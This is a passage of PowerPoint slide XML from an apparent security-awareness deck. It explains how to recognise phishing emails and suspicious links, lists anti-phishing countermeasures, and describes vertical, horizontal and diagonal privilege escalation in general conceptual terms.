            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="719999" y="280219"/>
            <a:ext cx="7704000" cy="457199"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>How to Identify a Phishing Attempt: A Practical Guide</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DEDA5125-C2E4-035A-7B7D-745033C9AE4F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Analyzing Links and URLs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Hover</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> over any link to see the actual destination URL in the status bar.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Does the URL match the context of the email? An email from your bank should not link to a random domain.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Look for HTTPS (the 'S' is for secure) and a padlock icon, but note that phishing sites often use HTTPS now, so this alone is not a guarantee of legitimacy.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Scrutinizing the Message Content</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Generic Greetings:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Dear Valued Customer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>" or "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Dear User</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>" instead of your name.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Poor Grammar and Spelling:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Professional organizations have editors; many phishing emails originate from non-native speakers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>A Sense of Urgency:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> "Act now or your account will be closed!"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Requests for Sensitive Information:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Legitimate companies will never ask for passwords, Social Security numbers, or credit card details via email.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="38247837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799AD-9BB3-98CD-1FCB-028C45DADE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743FF9-F321-33F3-06E9-1CDCDE978D16}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Countermeasures</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0C91FF6E-9DB4-C3BA-6630-B9CE2CA44FEE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Always check the real domain (the part immediately before .com / .org).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Don’t trust links from unsolicited emails/messages.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Hover over links before clicking → preview real destination.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Use browser anti-phishing filters.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Keep browser and security tools updated.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Educate users about URL tricks (homographs, encoding, subdomains).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Use enterprise email filtering &amp; URL rewriting solutions.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="136829082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83198-3D55-BDF8-016B-7B1544EAE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4B0E8A-3E37-30B4-E11A-7E4C57BD01C3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="268878"/>
            <a:ext cx="7704000" cy="541344"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Elevation of Privilege</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8445E119-D4AA-E018-208F-A41D74C5A620}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Attacker gains </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>higher-level access</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> than intended.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Exploits flaws in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>access control or vulnerabilities</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Example: user-level account escalates to admin.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Can be </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>vertical escalation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> (low privilege → high privilege).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>horizontal escalation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> (same privilege → another user’s data).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  May involve OS vulnerabilities or insecure app design.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Allows attacker to control critical systems/data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Often used as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>post-exploitation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> after initial compromise.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="420823061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6D6AA-9BCB-4892-EB93-D357063CF70E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Types of Elevation of Privilege</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E2B7CFA9-8953-3D12-B1DD-33482A621B54}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="825387"/>
            <a:ext cx="7704000" cy="4248057"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Vertical Privilege Escalation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Moving from a lower to higher privilege tier (e.g., local user → local admin, app user → application admin, cloud dev → tenant/global admin).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1800" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Horizontal Privilege Escalation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Accessing another user’s data/permissions at the same privilege level (e.g., user A reads user B’s records due to broken access control).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Diagonal Privilege Escalation (A Hybrid Approach)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>A combination of horizontal and vertical escalation. An attacker first compromises the account of a user at </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>the same level </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>(horizontal) and then uses that compromised account as a stepping stone to gain higher privileges (vertical).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="356830727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04E5C-6C7E-1ED3-A714-F101AD7F1BAB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Vertical Privilege Escalation</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{17D2922E-1B5E-1A21-D01F-4DFEE0C2CB8A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>How it's Achieved:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Exploiting Vulnerabilities: Leveraging software bugs (e.g., buffer overflows) in an application or OS to execute code with higher privileges (e.g., getting root on Linux or SYSTEM on Windows).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Credential Theft/Abuse: Stealing the password of an administrator account or abusing a misconfigured service account with excessive privileges.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Social Engineering: Tricking an administrator into running malicious code or disclosing credentials.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Examples:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A standard Windows user exploits a vulnerability to gain Local Administrator rights.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A regular user of a web application finds a way to activate a hidden function that grants them Application Administrator privileges.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A developer in a cloud environment misconfigures a role, allowing them to promote their own account to Tenant Administrator.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="306128996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C732A-6EDD-AFF6-7980-74DA5EAA8FCD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Horizontal Privilege Escalation</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B87570CB-615A-6FC6-E016-E0211B3ECF06}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>How it's Achieved:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Session Hijacking: Stealing another user's session cookie to impersonate them.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Insecure Direct Object References (IDOR): Manipulating an identifier in a URL or request (e.g., changing </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=123 to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=124) to access another user's information. This is a very common web application flaw.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Cross-Site Scripting (XSS): Using an XSS vulnerability to execute scripts that steal another user's data or session.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Examples:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>In a banking app, User A changes the account number in a URL parameter to view User B's account balance.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A user on a social media site guesses the URL of a private photo album belonging to another user.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="281657024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DE8BD-8C7C-0E0F-2B64-10A06034BF3C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Diagonal Privilege Escalation</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9B207E14-72CE-559E-3D05-64F8CD10A2BA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Key Characteristic: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>It's a multi-stage attack that uses horizontal movement as a means to achieve a vertical escalation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Why it's Significant: Higher-privilege accounts (e.g., admins) are often better protected and monitored. Attacking a standard user first is less risky and provides a foothold inside the network from which to pivot and target more valuable accounts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Horizontal: An attacker phishes the credentials for "User B," a standard employee.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Lateral Movement: The attacker logs in as User B and explores the internal network.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Vertical: From User B's machine, the attacker finds a stored password for a local admin account or exploits a vulnerability on a server to gain domain administrator privileges.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="275928505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B2316-8B74-1F84-F163-A9F69C1C967F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Impact of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Elevation of Privilege</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
